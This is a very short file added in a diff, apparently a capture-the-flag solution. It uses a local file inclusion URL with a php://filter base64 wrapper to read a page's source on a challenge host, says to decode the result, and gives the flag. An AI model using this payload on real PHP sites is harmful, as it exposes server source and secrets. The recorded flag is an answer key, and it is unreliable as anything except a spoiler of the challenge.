@@ -1,0 +1,8 @@
+1. 
+http://splitline.tw:8400/?page=php://filter/read=convert.base64-encode/resource=admin
+
+2.
+use base64 decoder
+
+3.
+FLAG{ezzzz_lfi}
